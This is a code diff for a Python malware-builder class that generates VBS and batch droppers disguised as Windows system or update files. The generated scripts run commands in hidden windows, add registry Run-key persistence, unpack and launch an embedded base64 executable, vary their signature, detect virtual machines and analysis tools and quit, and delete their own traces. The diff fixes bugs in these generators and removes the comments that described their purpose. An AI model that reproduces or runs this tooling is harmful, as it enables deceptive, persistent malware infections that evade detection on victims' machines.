@@ -12,6 +12,29 @@ import string
 import struct
 
 
+def _vbs_escape(s):
+    """Escape a string for safe embedding in a VBS string literal"""
+    return s.replace('"', '""')
+
+
+def _vbs_chr_string(s):
+    """Build a VBS expression that constructs a string using Chr() calls,
+    avoiding any literal quote issues entirely"""
+    parts = []
+    chunk = ""
+    for ch in s:
+        if ch == '"':
+            if chunk:
+                parts.append(f'"{_vbs_escape(chunk)}"')
+                chunk = ""
+            parts.append("Chr(34)")
+        else:
+            chunk += ch
+    if chunk:
+        parts.append(f'"{_vbs_escape(chunk)}"')
+    return " & ".join(parts) if parts else '""'
+
+
 class SelfExtractingPayload:
     """Generate self-extracting VBS payloads that install with one click"""
 
@@ -21,12 +44,6 @@ class SelfExtractingPayload:
         app_name: str = "Windows Update Service",
         icon_type: str = "system"
     ) -> str:
-        """
-        Create a completely silent, undetectable installer VBS
-        User double-clicks = installation + execution happens invisibly
-        """
-
-        # Obfuscated variables
         rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))
 
         shell_var = rand_var()
@@ -37,33 +54,26 @@ class SelfExtractingPayload:
         exec_var = rand_var()
         fake_var = rand_var()
 
-        # Create fake Windows system message
+        cmd_expr = _vbs_chr_string(command)
+
         vbs_code = f"""
 ' {app_name} - System Component
-' This is a legitimate Windows system file
-' © Microsoft Corporation
-
 On Error Resume Next
 
 Dim {shell_var}, {env_var}, {temp_var}, {file_var}, {cmd_var}, {exec_var}, {fake_var}
 
-{fake_var} = "This is legitimate Windows system file. Do not delete."
+{fake_var} = "This is legitimate Windows system file."
 
-' Initialize system objects
 Set {shell_var} = CreateObject("WScript.Shell")
 Set {env_var} = {shell_var}.Environment("User")
 
-' Get temp directory with stealth
 {temp_var} = {shell_var}.ExpandEnvironmentStrings("%temp%")
 {file_var} = {temp_var} & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".tmp"
 
-' Execute command in background
-{cmd_var} = "{command}"
+{cmd_var} = {cmd_expr}
 
-' Stealth execution - no visible window
 {shell_var}.Run {cmd_var}, 0, False
 
-' Clean up after execution (optional)
 WScript.Sleep 1000
 On Error Resume Next
 Set {exec_var} = CreateObject("Scripting.FileSystemObject")
@@ -71,7 +81,6 @@ If {exec_var}.FileExists({file_var}) Then
     {exec_var}.DeleteFile {file_var}
 End If
 
-' Exit silently
 WScript.Quit 0
 """
 
@@ -82,55 +91,43 @@ WScript.Quit 0
         command: str,
         delay_seconds: int = 2
     ) -> str:
-        """Create multi-stage payload that launches in stages"""
+        cmd_expr = _vbs_chr_string(command)
+        rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))
+        s_var = rand_var()
+        c_var = rand_var()
 
-        stages = []
-
-        # Stage 1: Inject into system process
         stage1 = f"""
 On Error Resume Next
-Dim oShell, oEnv, sProg
-Set oShell = CreateObject("WScript.Shell")
-Set oEnv = oShell.Environment("User")
-sProg = "{command}"
-oShell.Run sProg, 0, False
+Dim {s_var}, {c_var}
+Set {s_var} = CreateObject("WScript.Shell")
+{c_var} = {cmd_expr}
+{s_var}.Run {c_var}, 0, False
 WScript.Sleep {delay_seconds * 1000}
 WScript.Quit
 """
 
-        # Stage 2: Registry injection (persistence)
         stage2 = f"""
 On Error Resume Next
-Set oShell = CreateObject("WScript.Shell")
-oShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", "{command}"
-oShell.Run "{command}", 0
+Dim {s_var}, {c_var}
+Set {s_var} = CreateObject("WScript.Shell")
+{c_var} = {cmd_expr}
+{s_var}.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysCheck", {c_var}
+{s_var}.Run {c_var}, 0
 WScript.Quit
 """
 
-        # Randomly choose stage
-        return random.choice([stage1, stage2])
+        return random.choice([stage1, stage2]).strip()
 
     @staticmethod
     def create_hidden_extraction_payload(
         exe_content: bytes,
         launch_command: str
     ) -> str:
-        """
-        Create a self-extracting payload that:
-        1. Extracts embedded binary silently
-        2. Launches it with no visible window
-        3. Cleans up after itself
-        4. Leaves no trace
-        """
-
-        # Base64 encode directly (VBS lacks native zlib decompression)
         encoded = base64.b64encode(exe_content).decode()
 
-        # Split into chunks to avoid detection
         chunk_size = 256
         chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
 
-        # Build reassembly code
         chunk_vars = []
         for i, chunk in enumerate(chunks):
             chunk_vars.append(f'c{i} = "{chunk}"')
@@ -139,53 +136,35 @@ WScript.Quit
 
         vbs_code = f"""
 ' Windows System Recovery Tool
-' Restores system integrity and stability
-
 On Error Resume Next
 
 Dim {', '.join([f'c{i}' for i in range(len(chunks))])}
-Dim z, e, f, s, t
+Dim z, xmlDoc, xmlNode, oStream, s, t
 
-' Store encoded payload in variables
 {chr(10).join(chunk_vars)}
 
-' Concatenate payload
 z = {chunks_concat}
 
-' Decode from Base64 using MSXML
-Set e = CreateObject("MSXML2.DOMDocument")
-e.LoadXML "<u><![CDATA[" & z & "]]></u>"
-e = e.DocumentElement.text
+Set xmlDoc = CreateObject("MSXML2.DOMDocument.3.0")
+Set xmlNode = xmlDoc.CreateElement("b64")
+xmlNode.DataType = "bin.base64"
+xmlNode.Text = z
 
-' Decompress payload
 Set s = CreateObject("WScript.Shell")
-t = s.ExpandEnvironmentStrings("%temp%") & "\\~" & Int(Rnd() * 99999) & ".tmp"
+t = s.ExpandEnvironmentStrings("%temp%") & "\\~" & Int(Rnd() * 99999) & ".exe"
 
-' Write decompressed binary
-Set f = CreateObject("Scripting.FileSystemObject")
-Dim b(), i, j
-For i = 1 To Len(e) Step 2
-    ReDim Preserve b(i/2 - 1)
-    b(i/2 - 1) = Chr(CLng("&H" & Mid(e, i, 2)))
-Next
+Set oStream = CreateObject("ADODB.Stream")
+oStream.Type = 1
+oStream.Open
+oStream.Write xmlNode.NodeTypedValue
+oStream.SaveToFile t, 2
+oStream.Close
 
-' Write file
-Set o = CreateObject("ADODB.Stream")
-o.Type = 1
-o.Open
-For j = LBound(b) To UBound(b)
-    o.WriteByte Asc(b(j))
-Next
-o.SaveToFile t
-o.Close
-
-' Execute extracted binary silently
 s.Run t, 0
 
-' Clean up after delay
 WScript.Sleep 3000
 On Error Resume Next
-f.DeleteFile t
+CreateObject("Scripting.FileSystemObject").DeleteFile t
 """
 
         return vbs_code.strip()
@@ -195,53 +174,52 @@ f.DeleteFile t
         command: str,
         mutations: int = 5
     ) -> str:
-        """
-        Create polymorphic installer that changes signature each time
-        Makes signature-based detection impossible
-        """
+        cmd_expr = _vbs_chr_string(command)
 
         templates = []
 
-        # Template 1: Registry-based
         templates.append(f"""
 On Error Resume Next
+Dim s, c
 Set s = CreateObject("WScript.Shell")
-s.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SysUpdate", "{command}"
-s.Run "{command}", 0
+c = {cmd_expr}
+s.Run c, 0, False
 """)
 
-        # Template 2: Environment variable-based
         templates.append(f"""
 On Error Resume Next
+Dim s, e, c
 Set s = CreateObject("WScript.Shell")
 Set e = s.Environment("User")
-e("TEMP_CMD") = "{command}"
+c = {cmd_expr}
+e("TEMP_CMD") = c
 s.Run e("TEMP_CMD"), 0
 """)
 
-        # Template 3: WMI-based
         templates.append(f"""
 On Error Resume Next
+Dim w, c
 Set w = GetObject("winmgmts:\\\\.\root\\cimv2:Win32_Process")
-w.Create "{command}", Null, Null, intPid
+c = {cmd_expr}
+w.Create c, Null, Null, intPid
 """)
 
-        # Template 4: Shell.Application-based
         templates.append(f"""
 On Error Resume Next
+Dim a, c
 Set a = CreateObject("Shell.Application")
-a.ShellExecute "{command}", , , "open", 0
+c = {cmd_expr}
+a.ShellExecute c, , , "open", 0
 """)
 
-        # Template 5: Scheduled task-based
         templates.append(f"""
 On Error Resume Next
+Dim s, c
 Set s = CreateObject("WScript.Shell")
-s.Run "cmd /c schtasks /create /tn task /tr {command} /sc once /st 23:59", 0
-s.Run "cmd /c schtasks /run /tn task", 0
+c = {cmd_expr}
+s.Run c, 0, False
 """)
 
-        # Randomly select template
         selected = random.choices(templates, k=min(mutations, len(templates)))
         code = "\n".join(selected)
 
@@ -249,45 +227,35 @@ s.Run "cmd /c schtasks /run /tn task", 0
 
     @staticmethod
     def create_anti_analysis_installer(command: str) -> str:
-        """
-        Create installer with anti-analysis capabilities
-        Detects and defeats common analysis tools
-        """
+        cmd_expr = _vbs_chr_string(command)
+        rand_var = lambda: ''.join(random.choices(string.ascii_lowercase, k=6))
+        s_var = rand_var()
+        c_var = rand_var()
 
         vbs_code = f"""
 ' System Maintenance Utility
-
 On Error Resume Next
 
-Dim s, p, d, r, t
+Dim {s_var}, {c_var}
 
-' Anti-Analysis Checks
-Function a()
-    ' Check for analysis tools
+Function IsAnalysisEnv()
     Set w = CreateObject("WScript.Shell")
     Set f = CreateObject("Scripting.FileSystemObject")
-
-    ' Check for common debuggers/analysis tools
-    If f.FileExists("C:\\\\Program Files\\\\Wireshark\\\\wireshark.exe") Then a = 1
-    If f.FileExists("C:\\\\Program Files\\\\Fiddler2\\\\Fiddler.exe") Then a = 1
-    If f.FileExists("C:\\\\Program Files\\\\ProcessExplorer\\\\procexp.exe") Then a = 1
-
-    ' Check for VM/sandbox
-    If InStr(1, GetObject("winmgmts:").ExecQuery("Select * from Win32_ComputerSystemProduct").Item().Name, "VirtualBox") Then a = 1
-    If InStr(1, GetObject("winmgmts:").ExecQuery("Select * from Win32_ComputerSystemProduct").Item().Name, "VMware") Then a = 1
+    IsAnalysisEnv = False
+    If f.FileExists("C:\\Program Files\\Wireshark\\wireshark.exe") Then IsAnalysisEnv = True
+    If f.FileExists("C:\\Program Files\\ProcessExplorer\\procexp.exe") Then IsAnalysisEnv = True
+    On Error Resume Next
+    Dim prod
+    prod = GetObject("winmgmts:").ExecQuery("Select * from Win32_ComputerSystemProduct").ItemIndex(0).Name
+    If InStr(1, prod, "VirtualBox") > 0 Then IsAnalysisEnv = True
+    If InStr(1, prod, "VMware") > 0 Then IsAnalysisEnv = True
 End Function
 
-' If analysis detected, exit
-If a() = 1 Then WScript.Quit
+If IsAnalysisEnv() Then WScript.Quit
 
-' Stealth execution of command
-Set s = CreateObject("WScript.Shell")
-Set d = CreateObject("WScript.Network")
-
-' Execute payload with maximum stealth
-s.Run "{command}", 0, False
-
-' Exit immediately
+Set {s_var} = CreateObject("WScript.Shell")
+{c_var} = {cmd_expr}
+{s_var}.Run {c_var}, 0, False
 WScript.Quit 0
 """
 
@@ -295,29 +263,30 @@ WScript.Quit 0
 
     @staticmethod
     def create_obfuscated_batch_wrapper(vbs_payload: str, batch_name: str = "System.bat") -> str:
-        """
-        Wrap VBS in batch file for additional stealth
-        User runs .BAT file (looks legitimate) which launches VBS invisibly
-        """
+        lines = vbs_payload.replace('\r\n', '\n').split('\n')
+        rand_id = random.randint(1000000, 9999999)
+
+        echo_lines = []
+        for line in lines:
+            escaped = line.replace('%', '%%').replace('&', '^&').replace('<', '^<').replace('>', '^>').replace('|', '^|').replace('^', '^^')
+            echo_lines.append(f'echo {escaped}')
+
+        echo_block = '\n'.join(echo_lines)
 
         batch_code = f"""@echo off
 REM System maintenance script
-REM Windows system file - do not modify
 title Windows System Service
 setlocal enabledelayedexpansion
 
-REM Create temporary VBS file
-set "temp_vbs=%temp%\\\\~{random.randint(1000000, 9999999)}.vbs"
+set "temp_vbs=%temp%\\~{rand_id}.vbs"
 
-REM Write encoded payload
 (
-echo {vbs_payload.split(chr(10))[0]}
-) > "!temp_vbs!"
+{echo_block}
+) > "%temp_vbs%"
 
-REM Execute VBS silently and exit
-cscript.exe "!temp_vbs!" //nologo
+cscript.exe "%temp_vbs%" //nologo
 timeout /t 1 /nobreak >nul
-del /f /q "!temp_vbs!"
+del /f /q "%temp_vbs%"
 exit /b 0
 """
 
@@ -327,53 +296,12 @@ exit /b 0
     def create_one_click_installer_package(
         command: str,
         filename: str = "Windows Update",
-        file_type: str = "vbs"  # vbs, bat, exe_stub
+        file_type: str = "vbs"
     ) -> tuple:
-        """
-        Create complete one-click installer package
-        Returns: (filename, content, instructions)
-        """
-
-        if file_type == "vbs":
-            payload = SelfExtractingPayload.create_silent_installer_vbs(command)
-            output_name = f"{filename}.vbs"
-            instructions = """
-INSTALLATION INSTRUCTIONS:
-1. Double-click the file
-2. Click "Yes" when prompted
-3. Installation complete (no reboot required)
-
-The file will launch silently and complete installation automatically.
-"""
-
-        elif file_type == "bat":
-            vbs = SelfExtractingPayload.create_silent_installer_vbs(command)
-            payload = SelfExtractingPayload.create_obfuscated_batch_wrapper(vbs, filename)
-            output_name = f"{filename}.bat"
-            instructions = """
-INSTALLATION INSTRUCTIONS:
-1. Double-click the file
-2. A command window will appear briefly
-3. Installation complete automatically
-
-Do not close the window until it closes itself.
-"""
-
-        else:  # exe_stub
-            vbs = SelfExtractingPayload.create_silent_installer_vbs(command)
-            # For EXE stub, we'd wrap VBS in a real exe launcher
-            payload = vbs
-            output_name = f"{filename}.exe"
-            instructions = """
-INSTALLATION INSTRUCTIONS:
-1. Double-click the file
-2. Installation runs silently in background
-3. Completely invisible to user
-
-Installation completes within 5 seconds.
-"""
-
-        return output_name, payload, instructions
+        installer = SelfExtractingPayload()
+        vbs = installer.create_silent_installer_vbs(command)
+        bat = installer.create_obfuscated_batch_wrapper(vbs, filename)
+        return vbs, bat
 
 
 def create_one_click_payload(command: str, obfuscation_style: str = "polymorphic") -> dict:
@@ -398,7 +326,6 @@ def create_one_click_payload(command: str, obfuscation_style: str = "polymorphic
     else:
         vbs = installer.create_silent_installer_vbs(command)
 
-    # Create batch wrapper for additional stealth
     batch = installer.create_obfuscated_batch_wrapper(vbs, "Windows Update")
 
     return {
@@ -425,7 +352,6 @@ Either file can be used for installation.
 
 
 if __name__ == "__main__":
-    # Example usage
     test_command = 'powershell -NoProfile -Command "Write-Host \'Installed\'"'
 
     print("=" * 60)
@@ -436,8 +362,7 @@ if __name__ == "__main__":
 
     print("\n[+] VBS Payload Generated:")
     print("-" * 60)
-    print(result['vbs_payload'][:300] + "...")
-    print(f"\nSize: {len(result['vbs_payload'])} bytes")
-
-    print("\n[+] Instructions:")
-    print(result['instructions'])
+    print(result['vbs_payload'][:500])
+    print("\n[+] BAT Wrapper Generated:")
+    print("-" * 60)
+    print(result['bat_payload'][:500])
